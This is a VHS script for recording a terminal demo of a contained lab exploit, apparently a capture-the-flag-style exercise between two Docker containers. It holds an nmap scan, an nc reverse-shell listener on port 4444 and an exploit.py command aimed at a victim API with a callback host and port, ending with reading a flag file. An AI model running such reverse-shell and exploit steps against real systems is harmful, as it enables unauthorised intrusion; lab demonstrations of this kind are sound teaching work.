# VHS documentation
#
# Output:
#   Output <path>.gif               Create a GIF output at the given <path>
#   Output <path>.mp4               Create an MP4 output at the given <path>
#   Output <path>.webm              Create a WebM output at the given <path>
#
# Require:
#   Require <string>                Ensure a program is on the $PATH to proceed
#
# Settings:
#   Set FontSize <number>           Set the font size of the terminal
#   Set FontFamily <string>         Set the font family of the terminal
#   Set Height <number>             Set the height of the terminal
#   Set Width <number>              Set the width of the terminal
#   Set LetterSpacing <float>       Set the font letter spacing (tracking)
#   Set LineHeight <float>          Set the font line height
#   Set LoopOffset <float>%         Set the starting frame offset for the GIF loop
#   Set Theme <json|string>         Set the theme of the terminal
#   Set Padding <number>            Set the padding of the terminal
#   Set Framerate <number>          Set the framerate of the recording
#   Set PlaybackSpeed <float>       Set the playback speed of the recording
#
# Sleep:
#   Sleep <time>                    Sleep for a set amount of <time> in seconds
#
# Type:
#   Type[@<time>] "<characters>"    Type <characters> into the terminal with a
#                                   <time> delay between each character
#
# Keys:
#   Backspace[@<time>] [number]     Press the Backspace key
#   Down[@<time>] [number]          Press the Down key
#   Enter[@<time>] [number]         Press the Enter key
#   Space[@<time>] [number]         Press the Space key
#   Tab[@<time>] [number]           Press the Tab key
#   Left[@<time>] [number]          Press the Left Arrow key
#   Right[@<time>] [number]         Press the Right Arrow key
#   Up[@<time>] [number]            Press the Up Arrow key
#   Down[@<time>] [number]          Press the Down Arrow key
#   Ctrl+<key>                      Press the Control key + <key> (e.g. Ctrl+C)
#
# Display:
#   Hide                            Hide the subsequent commands from the output
#   Show                            Show the subsequent commands in the output

Output demo.mp4

Require echo
Require docker
Require git
Require tmux

Set FontSize 32
Set Width 1920
Set Height 1080
Set PlaybackSpeed 0.25

Sleep 3s

Type "docker build -t victim-image ./victim" Sleep 500ms  Enter
Sleep 10s
Type "docker build -t attacker-image ./attacker" Sleep 500ms  Enter
Sleep 10s

Type "docker network create --subnet 172.10.10.0/24 exploit-network" Sleep 500ms Enter
Sleep 10s

Type "docker run --net exploit-network --ip 172.10.10.2 --name attacker -d attacker-image" Sleep 500ms Enter
Sleep 5s
Type "docker run --net exploit-network --ip 172.10.10.3 --name victim -d victim-image" Sleep 500ms Enter
Sleep 10s


Type "tmux" Sleep 500ms Enter
Ctrl+b Type "%"
Type "docker exec -it attacker bash" Sleep 500ms Enter
Sleep 3s

Type "ip addr" Sleep 500ms Enter
Sleep 10s

Type "nmap 172.10.10.3" Sleep 500ms Enter
Sleep 10s

Type "nc -nlvp 4444" Sleep 500ms Enter
Sleep 3s

Ctrl+b Left
Type "docker exec -w /root -it attacker bash" Sleep 500ms Enter
Sleep 10s

Type "python3 exploit.py -u http://172.10.10.3:3000/api/osinfo?param --lport 4444 --lhost 172.10.10.2" Sleep 500ms Enter
Sleep 10s

Ctrl+b Right
Type "cat flag.txt" Sleep 500ms Enter
Sleep 10s

Ctrl+b Type "xy"
Ctrl+b Type "xy"

Type "docker rm victim -f" Sleep 500ms Enter
Type "docker rm attacker -f" Sleep 500ms Enter
Type "docker image rm victim-image -f" Sleep 500ms Enter
Type "docker image rm attacker-image -f" Sleep 500ms Enter
Type "docker network rm exploit-network" Sleep 500ms Enter

Sleep 10s
